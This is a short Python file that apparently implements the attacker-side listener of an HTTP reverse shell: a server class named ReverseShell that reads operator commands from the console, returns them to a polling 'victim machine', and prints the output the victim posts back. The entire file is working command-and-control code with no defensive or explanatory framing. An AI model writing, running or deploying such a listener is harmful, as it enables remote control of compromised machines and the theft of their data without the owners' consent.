import socketserver
import http.server
import cgi

PORT = 8080


class ReverseShell(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        command = input(">> ")

        # boilerplate http
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()

        # send command to victim machine
        self.wfile.write(command.encode())

    def do_POST(self):
        self.send_response(200)
        self.end_headers()
        # Define the length which means how many bytes the HTTP POST data contains
        length = int(self.headers['Content-Length'])

        # Read post then print the posted data
        postVar = self.rfile.read(length).decode()
        print(postVar)


with socketserver.TCPServer(("", PORT), ReverseShell) as httpd:
    print("serving at port", PORT)
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("Server is terminated")
        httpd.server_close()
